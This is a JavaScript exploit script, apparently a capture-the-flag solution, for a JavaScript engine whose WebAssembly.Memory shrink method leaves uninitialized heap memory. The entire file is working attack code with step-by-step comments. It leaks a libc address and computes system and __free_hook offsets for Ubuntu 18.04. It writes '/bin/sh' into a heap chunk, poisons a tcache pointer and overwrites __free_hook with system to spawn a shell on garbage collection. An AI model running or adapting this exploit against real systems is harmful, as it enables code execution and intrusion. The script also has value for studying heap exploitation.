// This exploit works only ubuntu 18.04
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function gc() { for (let i = 0; i < 20; i++) new ArrayBuffer(0x1000000); }
function ftoi(val) { // typeof(val) = float
		f64_buf[0] = val;
		return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) { // typeof(val) = BigInt
		u64_buf[0] = Number(BigInt(val) & 0xffffffffn);
		u64_buf[1] = Number(BigInt(val) >> 32n);
		return f64_buf[0];
}
function hex(val){
		return "0x"+val.toString(16)
}
function ltob(little_string){
        var target = little_string;
	var tar_len = target.length;
	for(let i =0;i<16-tar_len;i++){
		target = target + '0';
        }
	var addr_string = '0x';
	for(let i=0;i<8;i++){
		addr_string += target.slice(16-2*(1+i),16-2*i);
	}
	return addr_string;
}

function btol(big_string){
	var target = big_string;
	var tar_len = target.length;
	for(let i =0;i<16-tar_len;i++){
		target = '0'+target;
	}

	var addr_string = '0x';
	for(let i =0;i<8;i++){
		addr_string += target.slice(16-2*(1+i), 16-2*i);
	}
	console.log(addr_string);
	return addr_string;
}

var memory = new WebAssembly.Memory({initial:1, maximum:10});

// if memory size is bigger than page size(0x10000), use mmap.
// but memory size is smaller than page size, use heap chunk.
// allocate with uninialize, so it can leads to UAF.
memory.shrink(1); // this make allocate chunk to uninitalized memory.

var buf = memory.buffer;
view = new DataView(buf);
offset = 4113472n;//0x1ebb80n+0x810n//4113472n;

var little_libc = ftoi(view.getFloat64(0));

var libc = BigInt(ltob(little_libc.toString(16)))- offset;
var system = libc + 324944n;//0x55410n//324944n;
var free_hook_offset = 4118760n;//0x1eeb28n//4118760n;


console.log('[+] libc base : 0x'+libc.toString(16));
console.log('[+] free hook : 0x'+(libc+ free_hook_offset).toString(16));
console.log('[+] system : 0x'+system.toString(16));

var binsh_chunk = new ArrayBuffer(0x20);
var binsh = 0x2f62696e2f73683bn;
var binsh_view = new DataView(binsh_chunk);
binsh_view.setFloat64(0, itof(binsh)); //heap chunk that contain '/bin/sh'

memory.shrink(0x10000-0x60); //make 0x70 chunk

memory.shrink(1); //insert 0x70 chunk to tcache 
var b = memory.buffer;
var view = new DataView(b);
memory.shrink(1); //get 0x70 chunk from tcache and insert previous chunk

view.setFloat64(0, itof(btol((libc+ free_hook_offset-0x13n).toString(16)))); //corrupt fd
var new_memory = new WebAssembly.Memory({initial: 1, maximum: 10});
new_memory.shrink(0x10000-0x60);

var hook_memory = new WebAssembly.Memory({initial:1, maximum:10});
hook_memory.shrink(0x10000-0x60);
var hook = hook_memory.buffer;
var h_view = new DataView(hook);
h_view.setFloat64(0x13, itof(btol(system.toString(16)))); //overwrite free hook to system
gc(); //execute garbage collect.
